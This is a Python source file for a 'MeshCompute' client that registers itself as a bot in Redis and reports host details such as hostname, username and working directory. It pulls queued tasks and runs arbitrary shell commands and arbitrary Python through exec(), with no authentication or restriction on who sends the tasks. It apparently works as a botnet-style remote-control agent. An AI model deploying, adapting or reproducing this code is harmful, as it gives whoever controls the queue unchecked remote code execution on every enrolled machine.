import asyncio
import json
import uuid
import platform
import psutil
import time
import logging
import shlex
import os
from dotenv import load_dotenv
import redis.asyncio as redis
from common.config import REDIS_URL, MAX_COMMAND_TIMEOUT

load_dotenv()

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

bot_id = f"{str(uuid.uuid4())[:8]}-{platform.node()[:8]}"

async def get_system_info():
    return {
        "hostname": platform.node(),
        "os": platform.system() + " " + platform.release(),
        "python": platform.python_version(),
        "cpu": psutil.cpu_count(logical=False),
        "memory_gb": round(psutil.virtual_memory().total / (1024**3), 2),
        "username": os.getenv("USER") or os.getenv("USERNAME"),
        "cwd": os.getcwd(),
        "bot_id": bot_id,
        "pid": os.getpid()
    }

async def execute_command(cmd: str, timeout=MAX_COMMAND_TIMEOUT):
    try:
        args = shlex.split(cmd)
        proc = await asyncio.create_subprocess_exec(
            *args, stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        try:
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
        except asyncio.TimeoutError:
            proc.kill()
            await proc.wait()
            return {"success": False, "error": "Command timed out"}
        return {
            "success": proc.returncode == 0,
            "output": stdout.decode('utf-8', errors='replace'),
            "error": stderr.decode('utf-8', errors='replace'),
            "returncode": proc.returncode
        }
    except Exception as e:
        return {"success": False, "error": str(e)}

async def process_task(task: dict, r: redis.Redis):
    task_id = task["task_id"]
    action = task["action"]
    payload = task.get("payload")
    result = {
        "type": "result",
        "task_id": task_id,
        "bot_id": bot_id
    }

    if action == "exec":
        res = await execute_command(payload)
        result.update(res)
        result["command"] = payload
    elif action == "sysinfo":
        result["success"] = True
        result["info"] = await get_system_info()
    elif action == "python":
        try:
            exec_globals = {}
            exec(payload, exec_globals)
            output = exec_globals.get("output", "Code executed (no output variable)")
            result.update({"success": True, "output": str(output)})
        except Exception as e:
            result.update({"success": False, "error": str(e)})
    elif action == "ps":
        processes = [{"pid": p.info['pid'], "name": p.info['name'], "cpu": p.info['cpu_percent']}
                     for p in psutil.process_iter(['pid', 'name', 'cpu_percent'])]
        result.update({"success": True, "processes": processes[:50]})
    elif action == "ping":
        result.update({"success": True, "message": "pong"})
    else:
        result.update({"success": False, "error": f"Unbekannte Aktion: {action}"})

    result_key = f"mesh:results:{task_id}"
    await r.rpush(result_key, json.dumps(result))
    await r.expire(result_key, 300)

async def heartbeat_loop(r: redis.Redis):
    tick = 0
    while True:
        await r.sadd("active_bots", bot_id)
        await r.set(f"bot:{bot_id}:heartbeat", time.time())
        # FIX: Zähler statt Modulo-Zeit – Info alle 30s erneuern
        if tick % 3 == 0:
            info = await get_system_info()
            await r.set(f"bot:{bot_id}:info", json.dumps(info))
        tick += 1
        await asyncio.sleep(10)


async def create_robust_redis():
    while True:
        try:
            r = redis.from_url(REDIS_URL, decode_responses=True, socket_connect_timeout=10, socket_timeout=15)
            await r.ping()
            logger.info("Redis verbunden")
            return r
        except Exception as e:
            logger.error(f"Redis Verbindungsfehler: {e}. Warte 3s...")
            await asyncio.sleep(3)


async def main():
    while True:  # Outer reconnect loop
        r = None
        try:
            r = await create_robust_redis()

            # Initial registration
            info = await get_system_info()
            await r.set(f"bot:{bot_id}:info", json.dumps(info), ex=120)
            await r.sadd("active_bots", bot_id)

            heartbeat_task = asyncio.create_task(heartbeat_loop(r))

            while True:
                try:
                    result = await r.blpop("mesh:tasks", timeout=15)
                    if result is None:
                        continue

                    _, task_raw = result
                    task = json.loads(task_raw)

                    target = task.get("target", "all")
                    if target in ("all", bot_id, bot_id.split('-')[0]):
                        logger.info(f"Task {task['task_id']} bearbeitet")
                        await process_task(task, r)
                    else:
                        await r.rpush("mesh:tasks", task_raw)  # zurück in Queue
                except Exception as e:
                    logger.error(f"Task Loop Error: {e}")
                    await asyncio.sleep(2)

        except asyncio.CancelledError:
            break
        except Exception as e:
            logger.error(f"Schwerer Fehler im Main-Loop: {e}")
            await asyncio.sleep(5)
        finally:
            if r:
                await r.close()

if __name__ == "__main__":
    print(f"MeshCompute Client gestartet → {bot_id}")
    asyncio.run(main())